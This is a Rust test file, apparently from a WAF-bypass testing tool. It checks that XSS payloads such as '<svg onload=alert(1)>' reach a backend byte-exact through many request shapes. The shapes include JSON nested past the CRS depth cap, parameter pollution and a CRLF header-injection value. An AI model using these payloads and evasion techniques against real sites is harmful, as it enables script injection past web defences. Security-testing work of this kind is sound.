        let ck2 = DeliveryShape::Cookie { name: "q".into() }.to_request(t, evil);
        let cv = &ck2
            .headers
            .iter()
            .find(|(k, _)| k.eq_ignore_ascii_case("cookie"))
            .unwrap()
            .1;
        assert!(
            !cv.contains('\r') && !cv.contains('\n') && !cv.contains(';') && !cv.contains('\0'),
            "cookie value can forge structure: {cv:?}"
        );
    }

    #[test]
    fn transport_legal_enforces_rfc_boundaries() {
        let hv = DeliveryShape::HeaderValue { name: "X".into() };
        let ck = DeliveryShape::Cookie { name: "q".into() };
        // Header field-value: `<` `>` `"` INTERIOR space `=` `(` legal.
        assert!(hv.transport_legal("<svg onload=alert(1)>"));
        assert!(hv.transport_legal("\"';--><script>"));
        assert!(hv.transport_legal("a b c"), "interior SP is a legal octet");
        // CR/LF/NUL are illegal in a header value.
        assert!(!hv.transport_legal("a\rb"));
        assert!(!hv.transport_legal("a\nb"));
        assert!(!hv.transport_legal("a\0b"));
        // RFC 9110 §5.5: recipients strip leading/trailing OWS, so an
        // edge-whitespace payload would arrive TRIMMED (≠ member.payload)
        // — must be rejected as unsound, not "usually fine".
        assert!(!hv.transport_legal(" <svg>"), "leading SP would be trimmed");
        assert!(
            !hv.transport_legal("<svg> "),
            "trailing SP would be trimmed"
        );
        assert!(
            !hv.transport_legal("\t<svg>"),
            "leading HTAB would be trimmed"
        );
        assert!(
            !hv.transport_legal("<svg>\t"),
            "trailing HTAB would be trimmed"
        );
        // Cookie-octet: space, `;`, `,`, `"`, `\`, CTL all illegal.
        assert!(ck.transport_legal("<svg/onload=alert(1)>"));
        assert!(!ck.transport_legal("<svg onload=alert(1)>")); // space
        assert!(!ck.transport_legal("a;b"));
        assert!(!ck.transport_legal("a,b"));
        assert!(!ck.transport_legal("a\"b"));
        assert!(!ck.transport_legal("a\\b"));
        assert!(!ck.transport_legal(""));
        // Encoding shapes recover exact bytes — always legal.
        for d in [
            DeliveryShape::Query { param: "q".into() },
            DeliveryShape::PathSegment,
            DeliveryShape::JsonBody {
                param: "q".into(),
                content_type: None,
            },
        ] {
            assert!(d.transport_legal("a\r\n;\0\" anything"));
        }
    }

    #[test]
    fn generator_never_pairs_illegal_payload_with_raw_channel() {
        // Every Cookie/Header member the XSS generator yields must be
        // transport-legal for its channel AND still execute the script —
        // the delivery-axis anti-rig at the generator boundary.
        for atk in [
            "<svg onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "<a href=javascript:alert(1)>x</a>",
        ] {
            let members = xss_delivered(atk, 64);
            for m in &members {
                assert!(
                    xss::still_executes_xss(atk, &m.payload),
                    "unsound member {:?}",
                    m.payload
                );
                assert!(
                    m.delivery.transport_legal(&m.payload),
                    "{} member {:?} is NOT legal for that channel",
                    m.delivery.label(),
                    m.payload
                );
                // The rendered request can never carry a smuggle byte.
                if matches!(
                    m.delivery,
                    DeliveryShape::HeaderValue { .. } | DeliveryShape::Cookie { .. }
                ) {
                    let r = m.delivery.to_request("http://h/p", &m.payload);
                    for (_, v) in &r.headers {
                        assert!(
                            !v.contains('\r') && !v.contains('\n') && !v.contains('\0'),
                            "smuggle byte in rendered header: {v:?}"
                        );
                    }
                }
            }
        }
        // Both raw channels are deterministically reachable: a
        // space/`;`-free attack is cookie-octet-legal, so the identity
        // seed alone pairs it with Header AND Cookie.
        let legal = xss_delivered("<svg/onload=alert(1)>", 96);
        assert!(
            legal.iter().any(|m| m.delivery.label() == "header_value"),
            "header_value channel never exercised"
        );
        assert!(
            legal.iter().any(|m| m.delivery.label() == "cookie"),
            "cookie channel never exercised for a cookie-legal attack"
        );
    }
}

/// `Rng` unit tests (independent of any generator).
#[cfg(test)]
mod rng_tests {
    use super::Rng;

    // ── F-RNG-01: Rng::pick with the new implementation ───────────────

    /// `pick` on a single-element slice always returns that element.
    #[test]
    fn pick_single_element_is_that_element() {
        let mut rng = Rng::new(42);
        let xs = [99u32];
        assert_eq!(*rng.pick(&xs), 99);
    }

    /// `pick` on a two-element slice always returns one of them.
    #[test]
    fn pick_two_elements_stays_in_bounds() {
        let mut rng = Rng::new(0x1234);
        let xs = [10u32, 20u32];
        for _ in 0..100 {
            let v = *rng.pick(&xs);
            assert!(v == 10 || v == 20, "pick returned out-of-bounds value {v}");
        }
    }

    /// `pick` is uniform over a large sample (statistical sanity).
    #[test]
    fn pick_distributes_uniformly_over_many_trials() {
        let mut rng = Rng::new(0xDEAD_BEEF);
        let xs = [0u32, 1, 2, 3, 4];
        let mut counts = [0u64; 5];
        for _ in 0..5000 {
            counts[*rng.pick(&xs) as usize] += 1;
        }
        // Each bucket should appear at least 500 times (5000/5 * 0.5).
        for (i, &c) in counts.iter().enumerate() {
            assert!(c >= 500, "bucket {i} undersampled: {c}/5000");
        }
    }

    // ── F-RNG-01 regression: old code used `xs.len() - 1` before checking
    // emptiness, causing a subtraction overflow panic in debug mode and an
    // out-of-bounds panic in release.  The new code uses `below(xs.len())`
    // directly, which is always in-bounds for non-empty xs.
    // We cannot test the empty-slice panic here (it would abort the test run),
    // but we confirm the non-empty paths all return valid indices.

    /// `below(n)` always returns a value in `0..n`.
    #[test]
    fn below_always_in_range() {
        let mut rng = Rng::new(0xCAFE_BABE);
        for n in 1..=256usize {
            for _ in 0..20 {
                let v = rng.below(n);
                assert!(v < n, "below({n}) returned {v} which is out of range");
            }
        }
    }

    /// `below(0)` returns 0 (the documented guard for the zero case).
    #[test]
    fn below_zero_returns_zero() {
        let mut rng = Rng::new(7);
        assert_eq!(rng.below(0), 0);
    }

    /// `chance` with `num == den` is always true, with `num == 0` is always false.
    #[test]
    fn chance_boundary_conditions() {
        let mut rng = Rng::new(11);
        for _ in 0..50 {
            assert!(rng.chance(5, 5), "5/5 must always be true");
            assert!(!rng.chance(0, 5), "0/5 must always be false");
        }
    }

    /// `chance` with `den == 0` is always false (division-by-zero guard).
    #[test]
    fn chance_zero_denominator_returns_false() {
        let mut rng = Rng::new(999);
        for _ in 0..50 {
            assert!(!rng.chance(1, 0), "1/0 must be false (den==0 guard)");
        }
    }
}

/// ROUND-TRIP SOUNDNESS — the load-bearing invariant of the entire
/// `(payload × delivery)` algebra: whatever shape the payload is
/// delivered in, a conforming backend MUST recover the *exact same
/// bytes*. If any shape silently mangles the value (the class of bug
/// the earlier param-name-not-encoded defect belonged to), the WAF
/// might be bypassed but the exploit no longer fires — an unsound,
/// rigged "bypass". Every assertion decodes the rendered request the
/// way a real backend would and demands byte-equality.
#[cfg(test)]
mod delivery_roundtrip_tests {
    use super::*;

    fn pct_decode(s: &str) -> String {
        urlencoding::decode(s)
            .expect("renderer emitted non-UTF-8 percent-encoding")
            .into_owned()
    }

    /// Values a backend parses out of `?a=1&p=…&p=…` for `param`,
    /// in document order (urldecoded). Splitting on raw `&`/`=` is
    /// safe: the renderer percent-encodes those inside values.
    fn query_values(url: &str, param: &str) -> Vec<String> {
        let q = url.split_once('?').map_or("", |(_, q)| q);
        q.split('&')
            .filter_map(|kv| kv.split_once('='))
            .filter(|(k, _)| pct_decode(k) == param)
            .map(|(_, v)| pct_decode(v))
            .collect()
    }

    /// Minimal RFC 8259 JSON string-content unescaper — enough to
    /// invert `json_escape` (and then some, for robustness).
    fn json_unescape(s: &str) -> String {
        let b: Vec<char> = s.chars().collect();
        let mut out = String::with_capacity(s.len());
        let mut i = 0;
        while i < b.len() {
            if b[i] == '\\' && i + 1 < b.len() {
                match b[i + 1] {
                    '"' => out.push('"'),
                    '\\' => out.push('\\'),
                    '/' => out.push('/'),
                    'n' => out.push('\n'),
                    'r' => out.push('\r'),
                    't' => out.push('\t'),
                    'b' => out.push('\u{0008}'),
                    'f' => out.push('\u{000c}'),
                    'u' => {
                        let hex: String = b[i + 2..(i + 6).min(b.len())].iter().collect();
                        let cp = u32::from_str_radix(&hex, 16).expect("bad \\u escape");
                        out.push(char::from_u32(cp).expect("bad code point"));
                        i += 6;
                        continue;
                    }
                    other => out.push(other),
                }
                i += 2;
            } else {
                out.push(b[i]);
                i += 1;
            }
        }
        out
    }

    fn ct(r: &wafrift_types::Request) -> String {
        r.headers
            .iter()
            .find(|(k, _)| k.eq_ignore_ascii_case("content-type"))
            .map(|(_, v)| v.clone())
            .unwrap_or_default()
    }

    /// THE corpus: every byte-class that has historically broken a
    /// transport encoder.
    const PAYLOADS: &[&str] = &[
        "<svg onload=alert(1)>",
        "a&b=c&d",            // query-structure metachars
        "k=v=w",              // bare '=' run
        "\"';--></script>",   // quotes + angle
        "100% done",          // literal percent
        "a\r\nSet-Cookie: x", // CRLF (encoding shapes MUST still recover)
        "日本語<害>",         // multibyte
        "a/b/../c",           // slashes + dot segments
        "\\back\\slash\\",    // backslashes (JSON-sensitive)
        ";semi;colons;",      // cookie-sensitive
        " ",                  // lone space
        "",                   // empty
        "tab\tnull\u{0}end",  // control bytes (JSON \u escapes)
    ];

    #[test]
    fn every_encoding_shape_recovers_exact_payload_bytes() {
        let t = "http://app.tld/base/path?fixed=1";
        for &p in PAYLOADS {
            // Query
            let q = DeliveryShape::Query { param: "q".into() }.to_request(t, p);
            assert_eq!(
                query_values(&q.url, "q"),
                vec![p.to_string()],
                "Query mangled {p:?}"
            );

            // FormBody
            let fb = DeliveryShape::FormBody { param: "q".into() }.to_request(t, p);
            let body = String::from_utf8(fb.body.clone().unwrap_or_default()).unwrap();
            let (k, v) = body.split_once('=').expect("form body shape");
            assert_eq!(pct_decode(k), "q");
            assert_eq!(pct_decode(v), p, "FormBody mangled {p:?}");
            assert!(ct(&fb).contains("x-www-form-urlencoded"));

            // JsonBody (both CT modes recover identically)
            for c in [None, Some("application/json".to_string())] {
                let jb = DeliveryShape::JsonBody {
                    param: "q".into(),
                    content_type: c.clone(),
                }
                .to_request(t, p);
                let jbody = String::from_utf8(jb.body.clone().unwrap_or_default()).unwrap();
                // {"<k>":"<v>"} — strip the structural frame, unescape.
                let inner = jbody
                    .strip_prefix('{')
                    .and_then(|s| s.strip_suffix('}'))
                    .expect("json object frame");
                let (kq, vq) = inner.split_once(':').expect("json k:v");
                let key = json_unescape(kq.trim_matches('"'));
                let val = json_unescape(
                    vq.strip_prefix('"')
                        .and_then(|s| s.strip_suffix('"'))
                        .expect("quoted json value"),
                );
                assert_eq!(key, "q");
                assert_eq!(val, p, "JsonBody({c:?}) mangled {p:?}");
            }

            // Multipart field + file: raw, byte-transparent.
            for d in [
                DeliveryShape::MultipartField { name: "q".into() },
                DeliveryShape::MultipartFile {
                    name: "q".into(),
                    filename: "a.bin".into(),
                    part_ct: "application/octet-stream".into(),
                },
            ] {
                let mp = d.to_request(t, p);
                let body = String::from_utf8(mp.body.clone().unwrap_or_default()).unwrap();
                let bnd = ct(&mp)
                    .split_once("boundary=")
                    .map(|(_, b)| b.to_string())
                    .expect("multipart boundary");
                let after = body
                    .split_once("\r\n\r\n")
                    .map(|(_, x)| x)
                    .expect("part header/body sep");
                let recovered = after
                    .rsplit_once(&format!("\r\n--{bnd}"))
                    .map(|(x, _)| x)
                    .expect("closing boundary");
                assert_eq!(recovered, p, "{} mangled {p:?}", d.label());
                // RFC 7578: the boundary the renderer chose must not
                // occur inside the payload it framed.
                assert!(
                    !p.contains(bnd.as_str()) || bnd != MP_BOUNDARY,
                    "boundary collides with payload"
                );
            }

            // PathSegment
            let ps = DeliveryShape::PathSegment.to_request(t, p);
            let path = ps.url.split_once('?').map_or(ps.url.as_str(), |(a, _)| a);
            let seg = path
                .rsplit_once('/')
                .map(|(_, s)| s)
                .expect("a path segment");
            assert_eq!(pct_decode(seg), p, "PathSegment mangled {p:?}");
        }
    }

    #[test]
    fn raw_channels_recover_exact_bytes_when_transport_legal() {
        let t = "http://app.tld/p";
        let hv = DeliveryShape::HeaderValue {
            name: "X-Forwarded-Host".into(),
        };
        let ck = DeliveryShape::Cookie { name: "sid".into() };
        for &p in PAYLOADS {
            if hv.transport_legal(p) {
                let r = hv.to_request(t, p);
                let got = r
                    .headers
                    .iter()
                    .find(|(k, _)| k.eq_ignore_ascii_case("x-forwarded-host"))
                    .map(|(_, v)| v.clone())
                    .expect("header present");
                assert_eq!(got, p, "HeaderValue is not byte-transparent for {p:?}");
            }
            if ck.transport_legal(p) {
                let r = ck.to_request(t, p);
                let cv = r
                    .headers
                    .iter()
                    .find(|(k, _)| k.eq_ignore_ascii_case("cookie"))
                    .map(|(_, v)| v.clone())
                    .expect("cookie present");
                let (name, val) = cv.split_once('=').expect("cookie name=value");
                assert_eq!(name, "sid");
                assert_eq!(val, p, "Cookie is not byte-transparent for {p:?}");
            }
        }
    }

    /// Pins the documented backend-model dependence of `HppSplit`
    /// (now stated truthfully on the variant): the payload is whole in
    /// the LAST occurrence with benign decoys before it — sound on
    /// last-wins backends, and explicitly NOT a payload-split/concat
    /// technique. A regression that started fragmenting the payload
    /// across occurrences (resurrecting the old, wrong "concat" doc)
    /// would flip these assertions.
    #[test]
    fn hpp_split_is_last_occurrence_pollution_not_concat() {
        let t = "http://app.tld/p";
        let payload = "<svg onload=alert(1)>";
        let r = DeliveryShape::HppSplit {
            param: "q".into(),
            parts: 3,
        }
        .to_request(t, payload);
        let vs = query_values(&r.url, "q");
        assert_eq!(vs.len(), 4, "3 decoys + 1 payload occurrence");
        // Last-wins backend (PHP/Express/Spring/Rails): sound.
        assert_eq!(vs.last().unwrap(), payload, "payload not whole in last occ");
        // Decoys are throwaway markers, never payload fragments.
        for d in &vs[..3] {
            assert!(
                !payload.contains(d.as_str()) && d.starts_with('v'),
                "decoy {d:?} is a payload fragment — concat-splitting regressed"
            );
        }
        // First-wins backend would see a benign decoy (evasion-safe,
        // exploit-inert) — never a partial payload.
        assert_eq!(vs.first().unwrap(), "v0");
        // Concatenating backend would see decoys glued to the payload —
        // i.e. NOT the original. This is the documented unsound case;
        // asserting it keeps the variant doc honest.
        assert_ne!(vs.concat(), payload);
        assert!(vs.concat().ends_with(payload));
    }

    // ── new delivery shapes (XmlBody / JsonNestedDeep / GraphQLQuery) ────

    #[test]
    fn xml_body_recovers_exact_payload_bytes_for_every_corpus_member() {
        // The contract: backend XML parser decodes the entity-escaped
        // text node back to the original bytes. We re-decode here the
        // same way and assert byte-equality with the input payload.
        for &p in PAYLOADS {
            let r = DeliveryShape::XmlBody {
                root: "request".into(),
                field: "q".into(),
            }
            .to_request("http://h/app", p);
            let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
            assert!(body.contains("<?xml"), "XML prolog missing");
            assert!(ct(&r).contains("application/xml"));
            // <q>...</q> — extract inner text and entity-decode.
            let (_, after_open) = body.split_once("<q>").expect("inner field open tag");
            let (text, _) = after_open
                .split_once("</q>")
                .expect("inner field close tag");
            assert_eq!(xml_text_unescape(text), p, "XmlBody mangled {p:?}");
            // Anti-rig: the structural HTML-tag bytes (the WAF's actual
            // signature surface — `<…>`) must NOT reach the wire
            // un-escaped. Pure JS substrings like `onload=` carry no
            // angle bracket so they need no escaping; the WAF rule
            // chain for XSS keys on the `<tag …>` framing which we
            // entity-encoded away. We assert the framing markers are
            // gone, not every JS-flavoured substring.
            for tag in ["<svg", "<script", "<img", "<iframe", "<body"] {
                if p.contains(tag) {
                    assert!(
                        !text.contains(tag),
                        "{tag} reached the wire un-escaped — WAF would see it"
                    );
                }
            }
        }
    }

    #[test]
    fn xml_body_sanitises_attacker_root_and_field_names_adversarial() {
        // Defence-in-depth: if a caller passes hostile root/field
        // names (`</r><script>`, `q"`), the renderer must drop the
        // unsafe chars rather than letting them forge XML structure.
        let r = DeliveryShape::XmlBody {
            root: "</r><script>".into(),
            field: "q\"".into(),
        }
        .to_request("http://h/app", "x");
        let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
        assert!(
            !body.contains("<script>"),
            "hostile root forged <script> tag: {body}"
        );
        // The XML prolog legitimately contains `"` for its version /
        // encoding attribute values — the assertion is that hostile
        // bytes do not reach an ELEMENT name position. Slice past the
        // prolog and check there.
        let after_prolog = body.split_once("?>").map(|(_, x)| x).unwrap_or(&body);
        assert!(
            !after_prolog.contains('"'),
            "hostile field name forged an attribute quote in element position: {after_prolog}"
        );
        // The injected `</r>` close-tag bytes must also not appear in
        // post-prolog territory.
        assert!(
            !after_prolog.contains("</r>"),
            "hostile root forged a close tag: {after_prolog}"
        );
    }

    #[test]
    fn json_nested_deep_recovers_exact_payload_at_the_named_depth() {
        // The depth defeats CRS PL3's tx.json_max_depth = 5 cap; the
        // backend traverses the same depth and reaches the payload.
        for &depth in &[1usize, 5, 6, 8, 12] {
            for &p in PAYLOADS {
                let r = DeliveryShape::JsonNestedDeep {
                    param: "q".into(),
                    depth,
                }
                .to_request("http://h/app", p);
                let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
                assert!(ct(&r).contains("application/json"));
                // Walk `depth` outer "a" wrappers, then the final "q":"...".
                let mut s = body.as_str();
                for _ in 0..depth {
                    s = s.strip_prefix("{\"a\":").expect("nested 'a' wrapper");
                    assert!(s.ends_with('}'), "missing closing brace");
                    s = &s[..s.len() - 1];
                }
                // s is now {"q":"<escaped>"}
                let inner = s
                    .strip_prefix("{\"q\":\"")
                    .and_then(|x| x.strip_suffix("\"}"))
                    .expect("innermost {\"q\":\"...\"} shape");
                assert_eq!(json_unescape(inner), p, "depth={depth} mangled {p:?}");
            }
        }
    }

    #[test]
    fn json_nested_deep_caps_pathological_depth_no_panic() {
        // A hostile config could request usize::MAX depth and OOM the
        // renderer. The cap (64) bounds memory growth; the request
        // must still be a valid JSON object.
        let r = DeliveryShape::JsonNestedDeep {
            param: "q".into(),
            depth: usize::MAX,
        }
        .to_request("http://h/app", "x");
        let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
        // At depth 64 the body is < 1 KB — bounded as advertised.
        assert!(
            body.len() < 4096,
            "depth cap not enforced; body is {} bytes",
            body.len()
        );
        // Brace count must be balanced (well-formed JSON).
        let opens = body.bytes().filter(|&b| b == b'{').count();
        let closes = body.bytes().filter(|&b| b == b'}').count();
        assert_eq!(opens, closes, "unbalanced braces in nested body");
    }

    #[test]
    fn graphql_query_recovers_exact_payload_in_variables() {
        // The contract: GraphQL resolvers receive `variables.<var>` as
        // the original string value — JSON-escaped on the wire, decoded
        // by the GraphQL JSON envelope parser at the resolver boundary.
        for &p in PAYLOADS {
            let r = DeliveryShape::GraphQLQuery {
                field: "search".into(),
                var: "v".into(),
            }
            .to_request("http://h/graphql", p);
            let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
            assert!(ct(&r).contains("application/json"));
            assert!(
                body.contains("\"query\":") && body.contains("\"variables\":"),
                "GraphQL envelope missing: {body}"
            );
            // Extract `"v":"..."` value from variables.
            let var_start = body.find("\"v\":\"").expect("variable v key");
            let after = &body[var_start + 5..];
            let end = after.find("\"}").expect("variable value close");
            let val = &after[..end];
            assert_eq!(json_unescape(val), p, "GraphQL variable mangled {p:?}");
        }
    }

    #[test]
    fn graphql_query_sanitises_attacker_field_and_var_names_adversarial() {
        // Defence-in-depth: hostile field/var names must not break the
        // GraphQL query grammar (e.g. `field`="foo){alert(1)}//").
        let r = DeliveryShape::GraphQLQuery {
            field: "x){alert(1)}".into(),
            var: "v\\\"".into(),
        }
        .to_request("http://h/graphql", "p");
        let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
        // The sanitised field can keep `x`; the `){alert(1)}` must drop.
        // Specifically: no literal "alert(" should appear in the query
        // body and no naked `}` close before our intended one.
        let q_open = body.find("\"query\":\"").expect("query field");
        let q_close = body[q_open + 9..].find("\"").expect("query close");
        let query = &body[q_open + 9..q_open + 9 + q_close];
        assert!(
            !query.contains("alert("),
            "hostile field forged JS sink into the GraphQL query: {query}"
        );
    }

    /// Inverse of `xml_text_escape` — minimal entity decoder for the
    /// five entities we emit. Anything else passes through verbatim.
    fn xml_text_unescape(s: &str) -> String {
        s.replace("&lt;", "<")
            .replace("&gt;", ">")
            .replace("&quot;", "\"")
            .replace("&apos;", "'")
            .replace("&amp;", "&")
    }
}
